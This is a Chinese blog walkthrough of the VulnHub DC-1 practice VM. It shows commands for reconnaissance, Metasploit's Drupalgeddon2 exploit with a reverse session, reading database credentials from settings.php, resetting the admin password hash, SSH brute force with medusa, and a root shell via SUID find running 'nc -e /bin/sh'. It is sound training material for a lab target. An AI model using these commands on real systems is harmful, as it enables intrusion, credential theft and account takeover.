---
title: VulnHub DC1 通关纪实
date: 2020-3-9 20:00:23
tags:
  - vulnhub
categories:
  - ctf
abbrlink: vulnhub-dc-1
---



写在前面：本站内容仅供技术交流分享，切勿非法使用，一切技术后果自行承担



## Vulnhub 简介

Vulnhub是一个提供各种漏洞环境的靶场平台，供安全爱好者学习渗透使用，大部分环境是做好的虚拟机镜像文件，镜像预先设计了多种漏洞，需要使用 VMware 或者 VirtualBox 运行。每个镜像会有破解的目标，大多是 Boot2root，从启动虚机到获取操作系统的 root 权限和查看 flag。 

网址：https://www.vulnhub.com 

靶机下载地址： https://www.vulnhub.com/entry/dc-1-1,292/  

主机渗透系统：kali-linux-2020 

涉及渗透技术： 

* nmap, whatweb 等信息收集 
* msf 漏洞扫描和攻击 
* shell 反弹 
* 数据库修改 
* find -exec; 提权



## DC1 题目描述

![DC1](https://s3.xiabee.cn/pic/2023/03/455a20fe757ac295598364d2c3f38f552431b18c04cdd7b3e20be4ccf3ae12d0.png)

看题目描述，里面有多个 flag，也符合一次正常渗透攻击的流程：信息收集、对点攻击、横向移动、提升权限、痕迹清理等。

接下来我们一步一步来进行攻击。



## 搭建靶机环境

直接把下载下来的靶机解压，用 Vmware 或 VirtualBox 打开，注意网络配置，使渗透机器和靶机在同一个网段中，这里我们选择的是 NAT模式：即共用主机的IP地址：

<img src="https://s3.xiabee.cn/pic/2023/03/0635410c15bb6db2b7c5772d91c28441b70a86f1c9166199e9e7c2f1f26a55c5.png" alt="DC1" style="zoom:50%;" />



渗透主机和靶机均选择NAT模式，共享IP地址，建立在同一网段内 

注意这个靶机是让你直接渗透进去的，所以他没有告诉你登陆密码......~~博主太菜了，之前找了半天的密码www~~



## 信息收集

### 获取攻击主机 ip

```bash
ifconfig
## ifconfig 不行的话就 sudo ifconfig
## 这里我们可以看到，主机的地址为：192.168.80.128
```

![image-20230321143116269](https://s3.xiabee.cn/pic/2023/03/2a82565371c6f90404f212b536c5e6a2bed79b8cb77e8803001fbd744bc8c51e.png)

主机IP



### 获取目标靶机 ip

```bash
sudo arp-scan -l
# 如果执行失败可以先 sudo apt install arp-scan
```

![ip](https://s3.xiabee.cn/pic/2023/03/f23d91800cf6f7e9119eb87bc19a9b1738c441db53603c05cd3731d299da4046.png)

靶机IP可能为以上四个，然后我们通过一点点网关知识~~（或者逐个测试）~~可以确定靶机的IP为：`192.168.80.139`



### 靶机常规扫描

#### NMAP 全端口扫描 

```bash
nmap 192.168.80.139 -p 1-65535 -sV
# 扫描全部端口，康康靶机开放了哪些服务
```

![image-20230321145458091](https://s3.xiabee.cn/pic/2023/03/86e23510060f1fdc0a5a8481709f36078abf24b16387ef7dd8387ea7a4f85d88.png)



#### 网络框架扫描

扫描出一个 Drupal 7 系统

```bash
whatweb 192.168.80.139
```

![image-20230321145602571](https://s3.xiabee.cn/pic/2023/03/53526db9d8812ed14db9a9af92806c2bdf46c323b9a81b7358b7499687d59b02.png)



或者直接浏览器访问一下：好大一个 Drupal

![image-20230321145844417](https://s3.xiabee.cn/pic/2023/03/9047e71980a960ece783d626ff7799ef92e4a18c497b6930da8416a6b8c08a6f.png)



#### 目录扫描

```bash
dirb http://192.168.80.139
```

![image-20230321145959638](https://s3.xiabee.cn/pic/2023/03/d78e0af7858d50d09346386029c6c743f548802ddc2c8e98ccefee5b19805b69.png)



目前已知信息： 

* 靶机开放了80端口 
* 靶机 CMS 为 Drupal



## 结合 MSF 进行渗透

Metasploit 是很强大的漏洞查找工具 ，而且kali自带 Metasploit 

我们先尝试通过 MSF 拿下最初的控制权

### 进入 MSF 控制台



![image-20230321150159700](https://s3.xiabee.cn/pic/2023/03/9498bcb7d811728e9cb4f46547a32dec7ae641ac8e995425f3c48515920e42c6.png)



### 寻找 Durpal 漏洞

```bash
search Drupal
```

![image-20230321150347819](https://s3.xiabee.cn/pic/2023/03/45f832b6270998714ab7476fe59fa8503d14b6c925c8a502237684fce71f86a9.png)

drupal 框架可以直接利用的漏洞 然后我们通过几次简单的尝试，发现 `exploit/unix/webapp/drupal_drupalgeddon2` 可以利用，我们使用该模块 ~~（啊好吧其实是一个一个试过来的，发现前面的都不行）~~



```bash
use exploit/unix/webapp/drupal_drupalgeddon2 
# 使用该模块
show options
# 查看相关参数
```



我们注意 Required 这个地方，把它标记为 "yes" 的参数配置一下：rhost

如果第一次使用可能需还要配置 lhost 和 lport，即监听机的ip和端口



```bash
set rhost 192.168.80.139
# 这里的 rhost 即我们直接扫描发现的靶机ip
set lhost 192.168.80.129
# 之前 ifconfig 得到的主机ip
set lport 4444
# 随便设一个端口，不要被占用就行
```

![image-20230321150535278](https://s3.xiabee.cn/pic/2023/03/08c10d040fba587716981f616475c7450b8d63124a4ac957266b9d492edfc6c8.png)



然后 run 一下（或者 exploit 也行） 如果看到以下内容说明漏洞攻击成功了，建立了远程连接

![image-20230321150606737](https://s3.xiabee.cn/pic/2023/03/b37436fc23b821277488ecf899e1a8da1e116c0310fc5d11434c22b6f3553be2.png)



getshell一下，拿到 `shell`，并通过 `python` 反弹 `bash`:

```bash
shell
python -c 'import pty;pty.spawn("/bin/bash")'
# python反弹bash
```

![image-20230321150658450](https://s3.xiabee.cn/pic/2023/03/299f001e9fdb3c88cfc76b566d19369645ba07bc28fd4acb7a1d09417dbbdacf.png)

此时我们已经拿到了 bash-shell



## 寻找 FLAG

拿下初试控制权后随便逛逛先。

### FLAG1

直接明文给出来了，直接翻阅即可：

![image-20230321151011907](https://s3.xiabee.cn/pic/2023/03/91d1bac7f04cb09031c5f1cc33b98247a2ab70a6d3e9c7c91bc87f771084b090.png)



> Every good CMS needs a config file - and so do you. 
>
> flag1提示



### FLAG2

“每一个好的内容管理系统 都需要一个配置文件”——配置文件里面肯定有东西

```bash
cd sites
cd default
ls
# 此时可以看到一个 settings.php
```

![image-20230321151159512](https://s3.xiabee.cn/pic/2023/03/bd40c64dca13610e4e3672cd35551c3a8f55af51b59ef8fc1d24fbed3eb77898.png)

网站配置文件在 `/sites/default/` 中

直接翻阅：

```bash
cat settings.php
# 此时我们可以看到 flag2 以及数据库的用户名和密码
```

![image-20230321151248306](https://s3.xiabee.cn/pic/2023/03/e48a15044916a6c4f226354b8bd234c93365442a56a61accd1cacc79bd2a5006.png)

flag2 已找到

```bash
/**
 *
 * flag2
 * Brute force and dictionary attacks aren't the
 * only ways to gain access (and you WILL need access).
 * What can you do with these credentials?
 *
 */
 
'database' => 'drupaldb',
'username' => 'dbuser',
'password' => 'R0ck3t',
```



### FLAG3

flag2 暗示我们：暴力攻击也许不是唯一方式 同时我们看到了数据库的库名（drupaldb）、用户名（dbuser）和密码（R0ck3t），先记录下来，并通过这个用户登陆数据库：

```bash
mysql -udbuser -pR0ck3t
# 登陆数据库
use drupaldb;
# 使用 drupaldb 数据库
```

![image-20230321151405096](https://s3.xiabee.cn/pic/2023/03/941e485989b57ea2d27e661f596d77293a3e9ec4e10b8f75e6f6eb5e3df9ca3b.png)



成功登陆数据库 通过查询 users 表我们可以看到两个用户：`admin` 和 `Fred`，但是密码经过了哈希加密:

```mysql
select * from users;
```

![image-20230321151446233](https://s3.xiabee.cn/pic/2023/03/0499eb4f6f07a461dc27549e0c76a179b503adbbf3ac1454f36cba6b59160c7d.png)



继续查询，康康有没有有用的信息：（没错，我就是一个一个查过去的......

```mysql
select * from node,role;
```

![image-20230321151525814](https://s3.xiabee.cn/pic/2023/03/0bcdaae6b4138e2354e2a5a33dce38cdaf3ebaccc7bb5c5f477735a0e5779df5.png)



可以看到 flag3 的 title 既然 flag3 在表里面，那访问后台肯定能直接翻出来，现在开始尝试登陆管理员后台 

结合 flag2 的提示，通过非暴力手段进入，第一个反应应该就是修改密码了，直接开干





先退出数据库，进入/var/www/目录，直接使用它的加密脚本加密我们需要的密码：

```bash
cd /var/www/
php scripts/password-hash.sh 123 > pwd.txt
cat pwd.txt
# 进入可写目录，创建pwd.txt文件，并查看内容
```

![image-20230321151631488](https://s3.xiabee.cn/pic/2023/03/26e6e82e06f7d84511ea05515a656610c1ca998184cb2422419950f19d1dbd64.png)

得到"123"的哈希

进入数据库，修改admin密码：

```mysql
mysql -udbuser -pR0ck3t
# 进入数据库
use drupaldb;
# 使用 drupaldb 数据库
update users set pass = '$S$DRX6M.nvrKxrvQvj4kef1/pbQR0FzL1paS4sStmNxlFhADzUxvRe' where name = 'admin';
# 将密码改为123
truncate flood;
# 如果错误密码太多被锁定的话，这条语句可以解除锁定
```

![image-20230321151703018](https://s3.xiabee.cn/pic/2023/03/a9553d28504d7fe47214716f5bda7f5199b579cfcac1b9195f623745e5a54901.png)



此时数据库管理员密码已改为"123" 

用户名：admin 密码：123

登陆后台，寻找 content，寻找 flag3

![image-20230321151742109](https://s3.xiabee.cn/pic/2023/03/989eff04459d13cebd01f5f5c26540223798e04fc424add4a7a79a5f25715722.png)



此时看到 flag3:

![image-20230321151804947](https://s3.xiabee.cn/pic/2023/03/cbe6fdc80ee998662d4b659ec9eef5a3d1d566998158e2b1f8d91bb55c8a7688.png)

> Special PERMS will help FIND the passwd - but you'll need to -exec that command to work out how to get what's in the shadow. 
>
> flag3提示我们使用 find 执行操作



### FLAG4

```bash
find / -type f -perm -u=s 2>/dev/null
```

![image-20230321151901622](https://s3.xiabee.cn/pic/2023/03/fe64dfcb5e1e2cd32c8a7bfacea342107a11476b637f457346b01def6172c0b5.png)



发现 find 命令被设置为 suid 权限位，可以以 sudo 权限执行命令 

这个先放一边，我们再康康有没有其他有用信息。



查看用户：

```bash
cat /etc/passwd
```

![image-20230321151957821](https://s3.xiabee.cn/pic/2023/03/35d1966e33d863c121b29f6dddcd3a15854814bcfff468fe76209926c2675cbd.png)

发现一个名为 flag4 的用户

试试能不能直接访问：

```bash
cd /home/flag4
ls
cat flag4.txt
```



发现能直接访问...... 其实还有一一种办法进入 flag4，回到 kali 终端，暴力破解：

```bash
medusa -M ssh -h 192.168.80.139 -u flag4 -P /usr/share/john/password.lst -e ns -F 
```

![image-20230321152104102](https://s3.xiabee.cn/pic/2023/03/392f29b78a81b2872defd9361b34831fc28ef3f01eedc02e67e0e76aab7a7132.png)

暴力破解 flag4



最后得到flag4的用户密码为orange（出题人是有多喜欢橘子......）

![image-20230321152134824](https://s3.xiabee.cn/pic/2023/03/a0c4dff6978338cd65af2c1151392ee5032c7d998561112a2eef7bb0faeebc9c.png)



然后ssh登陆flag4：

```bash
ssh flag4@192.168.80.139
```

![image-20230321152454548](https://s3.xiabee.cn/pic/2023/03/c1010b31026bac7c8298d05790d6f0f10bc3d5d5b94b0ee495f027ca26d63329.png)

![image-20230321152502787](https://s3.xiabee.cn/pic/2023/03/b42be90adb660b2755c93b0d6fc066fb80583be0256a128de4aa040a93209dc2.png)



> Can you use this same method to find or access the flag in root?Probably. But perhaps it's not that easy. Or maybe it is? 
>
> flag4 提示：能否提权为root



### Final FLAG

结合我们 flag3 的提示，find 有执行权限，我们可以通过 find 提权： 网上其他骚造作很多，这里直接使用 nc 反弹 shell：

```bash
find flag4.txt -exec nc -lvp 2333 -e /bin/sh \;
# 靶机开启监听
```

![image-20230321152605468](https://s3.xiabee.cn/pic/2023/03/0e948ae428896be61fe4a5338a0bf8ee741b28c33b9a628bf0734f9c2db6a458.png)



```bash
nc 192.168.80.139 2333
# 回到 kali 主机，进入连接
```

![image-20230321152638721](https://s3.xiabee.cn/pic/2023/03/95ba79aef0fffeea958deff70f86327cffbb0eb3a1245b358792a2ad6ca97218.png)

以 root 身份连接

![image-20230321152648553](https://s3.xiabee.cn/pic/2023/03/10e39676a7984ffb51cb523833191d40f107cea102b9ba95668e97c74943198e.png)



finalflag

> Well done!!!! Hopefully you've enjoyed this and learned some new skills. You can let me know what you thought of this little journey by contacting me via Twitter - @DCAU7





## 小结 

菜狗博主的DC靶机第一次实践，看起来很简单，实际上找方法找了很久......

以后还得多加练习 QAQ 这次学到了原来 find 可以这么骚...... 

~~今天分享就到这里，下次再更新后续靶机攻击过程~~